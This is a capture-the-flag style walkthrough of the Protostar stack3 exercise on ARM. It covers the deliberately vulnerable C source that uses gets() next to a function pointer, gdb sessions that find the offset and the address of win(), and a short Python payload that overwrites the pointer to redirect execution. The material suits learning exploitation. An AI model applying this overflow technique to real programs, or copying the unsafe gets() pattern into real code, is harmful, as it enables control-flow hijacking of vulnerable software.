## Protostar ARM ./stack3

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

#### _Let's start_

In this challenge our goal is to call the `win()` function. The data used to jump to the win function will be the user input.

Let's compile
```c
gcc -g -fno-stack-protector -z execstack -no-pie -o stack3 stack3.c
```

and open the binary with gdb to take a look to the `win()` function and its address. To reach our goal, we have to overwrite the address of `fp()` with the address of `win()`.

```c
pi@raspberrypi:~/protostar/stack3 $ gdb ./stack3

...

Reading symbols from ./stack3...done.
gef➤  info functions
All defined functions:

File stack3.c:
11:	int main(int, char **);
6:	void win();

Non-debugging symbols:
0x0001030c  _init
0x0001032c  printf@plt
0x00010338  gets@plt
0x00010344  puts@plt
0x00010350  __libc_start_main@plt
0x0001035c  __gmon_start__@plt
0x00010368  abort@plt
0x00010374  _start
0x000103b0  call_weak_fn
0x000103d4  deregister_tm_clones
0x00010400  register_tm_clones
0x00010438  __do_global_dtors_aux
0x00010460  frame_dummy
0x000104dc  __libc_csu_init
0x0001053c  __libc_csu_fini
0x00010540  _fini
gef➤  disassemble main
Dump of assembler code for function main:
   0x00010480 <+0>:	push	{r11, lr}
   0x00010484 <+4>:	add	r11, sp, #4
   0x00010488 <+8>:	sub	sp, sp, #80	; 0x50
   0x0001048c <+12>:	str	r0, [r11, #-80]	; 0xffffffb0
   0x00010490 <+16>:	str	r1, [r11, #-84]	; 0xffffffac
   0x00010494 <+20>:	mov	r3, #0
   0x00010498 <+24>:	str	r3, [r11, #-8]
   0x0001049c <+28>:	sub	r3, r11, #72	; 0x48
   0x000104a0 <+32>:	mov	r0, r3
   0x000104a4 <+36>:	bl	0x10338 <gets@plt>
   0x000104a8 <+40>:	ldr	r3, [r11, #-8]
   0x000104ac <+44>:	cmp	r3, #0
   0x000104b0 <+48>:	beq	0x104c8 <main+72>
   0x000104b4 <+52>:	ldr	r1, [r11, #-8]
   0x000104b8 <+56>:	ldr	r0, [pc, #24]	; 0x104d8 <main+88>
   0x000104bc <+60>:	bl	0x1032c <printf@plt>
   0x000104c0 <+64>:	ldr	r3, [r11, #-8]
   0x000104c4 <+68>:	blx	r3
   0x000104c8 <+72>:	mov	r3, #0
   0x000104cc <+76>:	mov	r0, r3
   0x000104d0 <+80>:	sub	sp, r11, #4
   0x000104d4 <+84>:	pop	{r11, pc}
   0x000104d8 <+88>:	andeq	r0, r1, r12, ror #10
End of assembler dump.
gef➤  print win
$1 = {void ()} 0x10464 <win>
```

Setting a breakpoint right after the `gets()` function returns `(0x000104a8)` or `(0x000104ac)`, we can inspect the status.

```c
gef➤  b *0x000104ac
Breakpoint 1 at 0x104ac: file stack3.c, line 20.
gef➤  r
Starting program: /home/pi/protostar/stack3/stack3
aaaa

Breakpoint 1, 0x000104ac in main (argc=0x1, argv=0x7efff594) at stack3.c:20
20	  if(fp) {
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x7efff3fc  →  "aaaa"
$r1  : 0x0       
$r2  : 0x1       
$r3  : 0x0       
$r4  : 0x0       
$r5  : 0x000104dc  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r6  : 0x00010374  →  <_start+0> mov r11,  #0
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x76fff000  →  0x00030f44  →  0x00000000
$r11 : 0x7efff444  →  0x76e82718  →  <__libc_start_main+268> bl 0x76e99780 <__GI_exit>
$r12 : 0xfbad2288
$sp  : 0x7efff3f0  →  0x7efff594  →  0x7efff6e1  →  "/home/pi/protostar/stack3/stack3"
$lr  : 0x76ec8a60  →  <_IO_getline_info+280> ldr r3,  [sp,  #4]
$pc  : 0x000104ac  →  <main+44> cmp r3,  #0
$cpsr: [negative ZERO CARRY overflow interrupt fast thumb]
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efff3f0│+0x0000: 0x7efff594  →  0x7efff6e1  →  "/home/pi/protostar/stack3/stack3"	 ← $sp
0x7efff3f4│+0x0004: 0x00000001
0x7efff3f8│+0x0008: 0x00000000
0x7efff3fc│+0x000c: "aaaa"	 ← $r0
0x7efff400│+0x0010: 0x76ffd100  →  0x00000000
0x7efff404│+0x0014: 0x76ffd0fc  →  0x00000000
0x7efff408│+0x0018: 0x76ff9500  →  0x76e6b000  →  0x464c457f
0x7efff40c│+0x001c: 0x76e6ebc4  →  0x4ac6ae15
───────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
      0x104a0 <main+32>        mov    r0,  r3
      0x104a4 <main+36>        bl     0x10338 <gets@plt>
      0x104a8 <main+40>        ldr    r3,  [r11,  #-8]
 →    0x104ac <main+44>        cmp    r3,  #0
      0x104b0 <main+48>        beq    0x104c8 <main+72>
      0x104b4 <main+52>        ldr    r1,  [r11,  #-8]
      0x104b8 <main+56>        ldr    r0,  [pc,  #24]	; 0x104d8 <main+88>
      0x104bc <main+60>        bl     0x1032c <printf@plt>
      0x104c0 <main+64>        ldr    r3,  [r11,  #-8]
─────────────────────────────────────────────────────────────────────────────────────────── source:stack3.c+20 ────
     15	 
     16	   fp = 0;
     17	 
     18	   gets(buffer);
     19	 
           // fp=0x7efff43c  →  0x00000000
 →   20	   if(fp) {
     21	       printf("calling function pointer, jumping to 0x%08x\n", fp);
     22	       fp();
     23	   }
     24	 }
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack3", stopped 0x104ac in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x104ac → main(argc=0x1, argv=0x7efff594)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  print &fp
$1 = (int (**)()) 0x7efff43c
gef➤  print &buffer
$2 = (char (*)[64]) 0x7efff3fc
gef➤  print  0x7efff43c-0x7efff3fc
$3 = 0x40
```

So, also in this challenge, as the previous, we have to fill the buffer variable with the `char 'A'` and we concatenate the address of the function `win()` which is `0x10464`.

This time let's introduce a small Python script to solve the challenge

```Python
import struct

padding  = 'A' * 64
address_win = 0x10464

print padding + struct.pack('<I', address_win)

```
We import struct, we declare a variable `padding` to fill 64 bytes and the we pack it with `<I` (which means pack as Unsigned Int with Little Endian order the variable).

Let's run our code

```code
pi@raspberrypi:~/protostar/stack3 $ python check.py | ./stack3
calling function pointer, jumping to 0x00010464
code flow successfully changed
```

**_Done :)_**
